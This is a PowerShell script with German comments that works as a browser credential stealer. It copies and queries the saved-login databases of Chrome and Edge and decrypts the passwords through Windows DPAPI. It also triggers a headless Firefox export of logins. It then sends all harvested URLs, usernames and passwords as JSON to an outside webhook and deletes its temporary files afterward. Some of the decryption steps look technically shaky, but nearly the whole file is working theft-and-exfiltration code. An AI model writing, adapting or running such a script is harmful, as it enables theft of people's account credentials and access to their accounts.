# Funktion zum Entschlüsseln von verschlüsselten Passwörtern in Chromium-basierten Browsern (Chrome, Edge)
function Get-ChromiumPasswords {
    param (
        [string]$browserPath,
        [string]$browserName
    )

    $localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
    $dbPath = "$localAppData\$browserPath\User Data\Default\Login Data"
    $tempDb = "$env:TEMP\${browserName}_Login Data"

    # Kopieren der Datenbank, um Sperren zu vermeiden
    if (Test-Path $dbPath) {
        Copy-Item $dbPath $tempDb -Force
    } else {
        Write-Host "Datenbankpfad nicht gefunden: $dbPath"
        return @()
    }

    # Verbindung zur SQLite-Datenbank herstellen
    Add-Type -AssemblyName System.Data.SQLite
    $connectionString = "Data Source=$tempDb;Version=3;"
    $query = "SELECT origin_url, username_value, password_value FROM logins"

    # SQLite-Datenbank abfragen
    $connection = New-Object System.Data.SQLite.SQLiteConnection
    $connection.ConnectionString = $connectionString
    $connection.Open()

    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()

    $passwords = @()
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = $reader["password_value"]

        # Entschlüsseln des Passworts
        $entropy = [byte[]](0)
        $decryptedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($encryptedPassword), $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        $password = [System.Text.Encoding]::UTF8.GetString($decryptedPassword)

        $passwords += [PSCustomObject]@{ URL = $url; Username = $username; Password = $password }
    }

    $reader.Close()
    $connection.Close()
    Remove-Item $tempDb -Force

    return $passwords
}

# Funktion zum Exportieren von Passwörtern aus Firefox
function Export-FirefoxPasswords {
    $TopDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $DefaultProfileDir = (Get-ChildItem -LiteralPath $TopDir -Directory | Where-Object { $_.FullName -match '\.default' }).FullName
    $ExportPath = "$env:TEMP\firefox_passwords.csv"
    Start-Process -FilePath "firefox.exe" -ArgumentList "-headless", "-profile", $DefaultProfileDir, "-new-instance", "about:logins?action=export" -Wait
    
    # Warten, bis die Datei erstellt wurde
    Start-Sleep -Seconds 5
    
    return Import-Csv $ExportPath
}

# Passwörter exportieren
$EdgePasswords = Get-ChromiumPasswords -browserPath "Microsoft\Edge" -browserName "Edge"
$ChromePasswords = Get-ChromiumPasswords -browserPath "Google\Chrome" -browserName "Chrome"
$FirefoxPasswords = Export-FirefoxPasswords

# Alle Passwörter kombinieren
$AllPasswords = $EdgePasswords + $ChromePasswords + $FirefoxPasswords

# JSON-Payload erstellen
$JsonPayload = @{
    "passwords" = $AllPasswords
} | ConvertTo-Json

# Daten an Webhook senden
$Parameters = @{
    "Uri"         = $whuri
    "Method"      = "POST"
    "Body"        = $JsonPayload
    "ContentType" = "application/json"
}

Invoke-RestMethod @Parameters

# Temporäre CSV-Dateien löschen
Remove-Item "$env:TEMP\edge_passwords.csv" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\chrome_passwords.csv" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\firefox_passwords.csv" -ErrorAction SilentlyContinue
